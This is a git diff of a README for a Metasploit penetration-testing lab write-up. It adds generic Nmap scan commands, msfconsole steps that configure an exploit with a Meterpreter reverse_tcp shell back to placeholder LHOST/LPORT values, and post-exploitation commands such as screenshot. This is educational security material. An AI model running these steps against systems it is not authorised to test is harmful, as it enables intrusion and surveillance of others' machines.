@@ -6,11 +6,11 @@ The Metasploit testing project aimed to provide a comprehensive understanding of
 
 ### Skills Learned
 
-- In-depth knowledge of penetration testing methodologies and ethical hacking principles.
-- Proficiency in using the Metasploit Framework for vulnerability assessment and exploitation.
-- Ability to perform reconnaissance and footprinting on target systems.
-- Enhanced skills in scripting and automation for security testing.
-- Understanding of post-exploitation techniques and maintaining access.
+- Penetration Testing Methodologies: Gained in-depth knowledge of methodologies and principles of ethical hacking.
+- Metasploit Proficiency: Developed proficiency in using the Metasploit Framework for vulnerability assessment and exploitation.
+- Reconnaissance and Footprinting: Acquired abilities to perform reconnaissance on target systems using Nmap.
+- Scripting and Automation: Enhanced skills in scripting and automation for effective security testing.
+- Post-Exploitation Techniques: Understood post-exploitation techniques and methods for maintaining access.
 
 ### Tools Used
 
@@ -22,38 +22,99 @@ The Metasploit testing project aimed to provide a comprehensive understanding of
 ## Steps
 
 ### 1. Environment Setup
-Installed Kali Linux and configured the Metasploit Framework for testing.
+- Installed Kali Linux and configured.
+- Install Metasploit:
+   - ```bash
+      sudo apt update
+      sudo apt install metasploit-framework
 
-Environment Setup
-Ref 1: Initial setup of the Kali Linux environment with Metasploit.
-
+---
 
 ### 2. Reconnaissance
-Utilized Nmap to identify open ports and services on the target machine.
+- Utilized Nmap to identify open ports and services on the target machine.
+- Basic Nmap Scan Command:
+  ```bash
+  nmap -sS -p- <target-ip>
+  ```
+  - Conducts a stealth SYN scan.
+  ```bash
+  -sS
+  ```
+  - Scans all 65535 ports.
+  ```bash
+  -p
+  ```
+  
+- Service Version Detection:
+  ```bash
+  nmap -sV <target-ip>
 
-Nmap Scan
-Ref 2: Nmap scan results showcasing open ports and services.
-
+---
 
 ### 3. Exploitation
 Executed a vulnerability exploit using Metasploit against the target machine.
+- Start Metasploit Framework:
+  ```bash
+  msfconsole
+  
+- Search for available exploits:
+  ```bash
+  search <service-name>
 
-Exploitation
-Ref 3: Successful exploitation of a vulnerable service.
+- Use a specific exploit:
+  ```bash
+  use exploit/multi/http/<exploit-name>
 
+- Set the target options:
+  ```bash
+  set RHOST <target-ip>
+  set RPORT <target-port>
+
+- Set the payload options (example for reverse shell):
+  ```bash
+  set PAYLOAD linux/x86/meterpreter/reverse_tcp
+  set LHOST <your-ip>
+  set LPORT <your-port>
+
+- Execute the exploit:
+  ```bash
+  exploit
+
+
+---
 
 ### 4. Post-Exploitation
-Demonstrated post-exploitation techniques such as privilege escalation.
+Once you gain access, use Meterpreter commands. 
+- To escalate privileges:
+  ```bash
+  getuid
+  ```
+- To explore the file system:
+  ```bash
+  ls
+  cd <directory>
+  ```
 
-Post-Exploitation
-Ref 4: Post-exploitation access and actions taken on the target system.
+- To capture a screenshot:
+  ```bash
+  screenshot
 
+
+---
 
 ### 5. Reporting
 Compiled findings into a professional report detailing vulnerabilities discovered and remediation steps.
 
-Report
-Ref 5: Overview of the final report summarizing the penetration test results.
+- Example report:
+  ```bash
+  Vulnerability Summary
+  | Vulnerability         | Description                         | Remediation                       |
+  |-----------------------|-------------------------------------|-----------------------------------|
+  | Open Port             | Port 80 is open                     | Disable unneeded services         |
+  | Vulnerable Service    | Apache version vulnerable to CVE-X  | Upgrade Apache to latest version  |
+
+
+---
 
 ## Conclusion
 
